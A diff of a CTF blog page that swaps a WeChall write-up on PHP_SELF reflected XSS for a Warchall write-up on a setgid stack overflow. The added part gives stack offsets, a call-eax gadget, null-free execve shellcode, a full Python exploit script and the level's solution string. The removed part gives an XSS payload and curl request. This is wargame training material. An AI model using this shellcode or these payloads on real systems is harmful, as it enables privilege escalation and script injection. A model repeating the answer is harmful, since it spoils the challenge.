-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-yourself-php/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-yourself-php/" class="post-title-link" itemprop="url">WeChall - Yourself PHP</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-09 16:55:57" itemprop="dateCreated datePublished" datetime="2026-06-09T16:55:57+08:00">2026-06-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 10:08:14" itemprop="dateModified" datetime="2026-09-15T10:08:14+08:00">2026-09-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-yourself-php/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-yourself-php/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Your mission is to inject alert(1); into this script, and make it
-popup a javascript alert.</p>
-<p>目标是在页面里注入
-<code>alert(1);</code>。现在这题不再依赖浏览器真实弹窗，而是检查 payload
-后静默修补输出并判定结果。</p>
-</blockquote>
+          <p>Warchall level 7：32-bit setgid ELF 栈溢出。ASLR enabled 但 NX
+disabled、无 PIE、无 canary，非常适合 ret2reg + shellcode 经典打法。利用
+<code>memcpy</code> 返回后 EAX 残留 vulnbuf 地址的特性，通过
+<code>call *%eax</code> gadget 跳转到栈上 shellcode 获取 setgid
+shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 19198 level07@warchall.net</span><br><span class="line">/home/level/07_tropical_fruits/</span><br></pre></td></tr></table></figure>
 <h3 id="challenge">Challenge</h3>
-<p>题目给了源码入口：<code>index.php?highlight=christmas</code>。页面上有一个
-<code>username</code> 表单，直觉上像是要在用户名字段里做 XSS，但源码对
-<code>username</code> 做了 <code>htmlspecialchars()</code>：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title class_">GWF_Box</span>::<span class="title function_ invoke__">box</span>(<span class="title function_ invoke__">sprintf</span>(</span><br><span class="line">        <span class="string">&quot;Well done %s, you entered your username. But this is &lt;b&gt;not&lt;/b&gt; what you need to do.&quot;</span>,</span><br><span class="line">        <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title class_">Common</span>::<span class="title function_ invoke__">getPostString</span>(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>所以 <code>username</code> 只是诱饵。题名是 Yourself
-PHP，真正要看的点是 <code>$_SERVER['PHP_SELF']</code>。</p>
+<p>32-bit setgid ELF binary，源码由 <code>hint()</code> 函数泄露（调用
+<code>printf</code> 打印 "Need to bypass aslr" 后
+<code>exit(0)</code>）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hint</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Need to bypass aslr\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnfunc</span><span class="params">(<span class="type">char</span> *input)</span> &#123;</span><br><span class="line">    <span class="type">char</span> vulnbuf[<span class="number">300</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(vulnbuf, input, <span class="built_in">strlen</span>(input));  <span class="comment">// 无边界检查</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>) vulnfunc(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%s &lt;input&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>保护: setgid level07, NX disabled (GNU_STACK RWE), No PIE, No canary,
+ASLR enabled. libc: glibc 2.35.</p>
 <h3 id="solution">Solution</h3>
-<p>关键代码在表单输出这里：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box box_c&quot;&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;&lt;form action=&quot;%s&quot; method=&quot;post&quot;&gt;&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;&lt;div&gt;%s&lt;/div&gt;&#x27;</span>, GWF_CSRF::<span class="title function_ invoke__">hiddenForm</span>(<span class="string">&#x27;phpself&#x27;</span>)).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;&lt;div&gt;Username:&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;&lt;/div&gt;&#x27;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;&lt;div&gt;&lt;input type=&quot;submit&quot; name=&quot;deadcode&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&#x27;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;&lt;/form&gt;&#x27;</span>).PHP_EOL;</span><br></pre></td></tr></table></figure>
-<p><code>$_SERVER['PHP_SELF']</code> 被直接填入 HTML attribute：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;...&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>普通访问时，<code>PHP_SELF</code> 只是脚本路径：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/yourself_php/index.php</span><br></pre></td></tr></table></figure>
-<p>但 PHP / Web server 通常会把 <code>index.php</code> 后面的 path info
-也放进 <code>PHP_SELF</code>。访问下面这种路径时：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/yourself_php/index.php/anything</span><br></pre></td></tr></table></figure>
-<p>模板里的 <code>%s</code> 会变成：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/challenge/yourself_php/index.php/anything&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>于是攻击面不在 POST body，而在 URL path info。只要让 path info 先闭合
-<code>action</code> 的双引号，再闭合 <code>&lt;form&gt;</code>
-起始标签，就能插入脚本节点：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>拼回模板后，旧版漏洞会生成类似这样的 HTML：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/challenge/yourself_php/index.php/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot; method=&quot;post&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>浏览器解析时：</p>
-<ol type="1">
-<li><code>"</code> 结束 <code>action</code> 属性。</li>
-<li><code>&gt;</code> 结束 <code>&lt;form&gt;</code> 起始标签。</li>
-<li><code>&lt;script&gt;alert(1);&lt;/script&gt;</code>
-成为真正的脚本节点。</li>
-<li>后面的 <code>" method="post"&gt;</code> 只是残留文本，不影响前面的
-script 执行。</li>
-</ol>
-<p>当前 WeChall 源码已经在检查后静默修补了这个输入，注释里写的是：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Check your injection and fix the hole by silently applying htmlsepcialchars to the vuln input.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">phpself_checkit</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$chall</span>-&gt;<span class="title function_ invoke__">onChallengeSolved</span>(<span class="title class_">GWF_Session</span>::<span class="title function_ invoke__">getUserID</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里的 <code>htmlsepcialchars</code>
-是源码注释里的原拼写。也就是说，现在的题目更像 simulated
-challenge：<code>phpself_checkit()</code> 检查静态
-payload，命中后判定正确；不需要真的让当前页面弹窗。</p>
-<p>实际访问时用 URL-encoded payload，避免 shell、URL 和 HTML 对
-<code>&lt;</code>、<code>&gt;</code>、<code>"</code> 的处理差异：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL \</span><br><span class="line">  -H <span class="string">&#x27;User-Agent: Mozilla/5.0&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/yourself_php/index.php/%22%3E%3Cscript%3Ealert(1);%3C/script%3E&#x27;</span> \</span><br><span class="line">  | grep -o <span class="string">&#x27;Your answer is correct&#x27;</span></span><br><span class="line">Your answer is correct</span><br></pre></td></tr></table></figure>
-<p>如果带登录态访问同一个 URL，命中后会把挑战记到当前账号；最终以
-<code>/en/challs</code> 里 <code>Yourself PHP</code> 的
-<code>wc_chall_solved_1</code> 为准。</p>
+<p><strong>漏洞</strong>:
+<code>memcpy(vulnbuf, input, strlen(input))</code>
+无边界检查，栈溢出。</p>
+<h4 id="stack-layout">Stack Layout</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sub esp, 0x148 (328 bytes)</span><br><span class="line">vulnbuf  at ebp - 0x134 (ebp - 308)</span><br><span class="line">return addr at ebp + 4</span><br><span class="line">Offset to return address: 308 + 4 = 312 bytes</span><br></pre></td></tr></table></figure>
+<h4 id="关键-gadget">关键 Gadget</h4>
+<p><code>memcpy</code> 返回后 EAX = vulnbuf 地址（即栈上 shellcode
+地址），因此可以用 <code>call *%eax</code> 直接跳转到 shellcode。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080484cf: call *%eax   ← 跳转到 shellcode</span><br></pre></td></tr></table></figure>
+<h4 id="shellcode">Shellcode</h4>
+<p>Null-free, 42 bytes:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">; setregid(507, 507) — 继承 setgid 权限</span><br><span class="line">xor eax, eax</span><br><span class="line">xor ebx, ebx</span><br><span class="line">xor ecx, ecx</span><br><span class="line">mov bx, 0x1fb   ; 507</span><br><span class="line">mov cx, 0x1fb   ; 507</span><br><span class="line">mov al, 0x47    ; setregid32</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">; execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], NULL)</span><br><span class="line">xor eax, eax</span><br><span class="line">push eax</span><br><span class="line">push &quot;//sh&quot;</span><br><span class="line">push &quot;/bin&quot;</span><br><span class="line">mov ebx, esp</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp</span><br><span class="line">cdq             ; edx = 0</span><br><span class="line">mov al, 0x0b    ; execve</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<h4 id="exploit">Exploit</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Warchall Level 7 — Tropical Fruits exploit.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># Null-free shellcode (42 bytes)</span></span><br><span class="line">shellcode = (</span><br><span class="line">    <span class="string">b&quot;\x31\xc0\x31\xdb\x31\xc9&quot;</span>              <span class="comment"># xor eax; xor ebx; xor ecx</span></span><br><span class="line">    <span class="string">b&quot;\x66\xbb\xfb\x01\x66\xb9\xfb\x01&quot;</span>      <span class="comment"># mov bx, 0x1fb; mov cx, 0x1fb</span></span><br><span class="line">    <span class="string">b&quot;\xb0\x47\xcd\x80&quot;</span>                      <span class="comment"># mov al, 0x47; int 0x80</span></span><br><span class="line">    <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68&quot;</span>      <span class="comment"># xor eax; push eax; push &quot;//sh&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x68\x2f\x62\x69\x6e\x89\xe3&quot;</span>          <span class="comment"># push &quot;/bin&quot;; mov ebx, esp</span></span><br><span class="line">    <span class="string">b&quot;\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;</span>  <span class="comment"># push eax; push ebx; mov ecx, esp; cdq; mov al, 0x0b; int 0x80</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">312</span></span><br><span class="line">CALL_EAX = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x080484cf</span>)</span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">b&quot;\x90&quot;</span> * (OFFSET - <span class="built_in">len</span>(shellcode)) + CALL_EAX</span><br><span class="line"></span><br><span class="line">subprocess.run(</span><br><span class="line">    [<span class="string">&quot;/home/level/07_tropical_fruits/level07&quot;</span>, payload],</span><br><span class="line">    env=&#123;<span class="string">&quot;PWD&quot;</span>: <span class="string">&quot;/home/level/07_tropical_fruits&quot;</span>&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>执行后交互式 shell 继承 setgid level07，可读 solution.txt。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">LetsGetItOn!</span></span>
 
       
     </div>
@@ -1650,7 +1878,7 @@ payload，命中后判定正确；不需要真的让当前页面弹窗。</p>
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/16/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><span class="page-number current">17</span><a class="page-number" href="/page/18/">18</a><span class="space">&hellip;</span><a class="page-number" href="/page/46/">46</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/18/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/16/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><span class="page-number current">17</span><a class="page-number" href="/page/18/">18</a><span class="space">&hellip;</span><a class="page-number" href="/page/57/">57</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/18/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
